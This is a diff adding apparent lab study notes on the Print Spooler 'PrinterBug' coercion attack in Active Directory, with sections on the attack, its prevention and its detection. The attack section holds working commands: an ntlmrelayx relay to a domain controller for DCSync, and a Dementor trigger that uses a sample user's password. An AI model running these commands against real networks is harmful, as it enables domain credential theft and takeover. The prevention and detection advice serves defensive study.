@@ -1,0 +1,53 @@
+Description:
+
+  - Print Spooler is an old service enabled by default
+
+  - RpcRemoteFindFirstPrinterChangeNotification and RpcRemoteFindFirstPrinterChangeNotificationEx can be abused to force a remote machine to perform a connection to any other
+    machine it can reach.
+
+  - The reverse connection will carry authentication informatin as a TGT.
+
+  - Any Domain user can coerce RemoteServer$ to authenticate to any machine.
+
+
+Attack:
+
+  - We will relay connection to another DC and perform DCSync
+
+    impacket-ntlmrelayx -t dcsync://172.16.18.4 -smb2support
+
+  - Next trigger the PrinterBug using NTLMRelayx listening.
+
+  - Utilize Dementor on Kali to trigger connection back.
+
+    python3 ./dementor.py 172.16.18.20 172.16.18.3 -u bob -d eagle.local -p Slavi123
+
+  - Switching back to terminal session with NTLMRelayx we will see the DCSync was successful
+
+
+Prevention:
+
+  - Print spooler should be disabled on all servers that are not printing servers
+
+  - DC and other core servers should never have additional roles/functionalities that open and widen the attack surface toward the core AD infrastructure
+
+  - Disable the registry key RegisterSpoolerRemoteRpcEndPoint: this will block remote requests
+
+  - Setting the key value to 1 enables and 2 disables
+
+
+Detection:
+
+  - To obtain hashes as DC1 from DC2 there will be a successful logon event for DC1. Event will have a source IP that does not match the DC since it is coming from kali machine
+
+
+
+
+
+
+
+
+
+
+
+
